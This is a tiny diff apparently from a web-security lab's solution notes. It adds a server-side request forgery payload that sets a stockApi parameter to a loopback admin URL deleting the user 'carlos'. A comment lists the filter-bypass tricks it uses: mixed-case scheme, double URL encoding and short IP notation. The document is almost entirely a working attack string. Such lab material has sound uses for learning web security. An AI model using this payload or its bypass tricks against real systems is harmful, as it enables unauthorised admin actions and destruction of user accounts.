@@ -1,0 +1,3 @@
+stockApi=htTP://127.1/%2561dmin/delete?username=carlos
+
+Case variation + Double URL encoding + Alternative ways to write IP
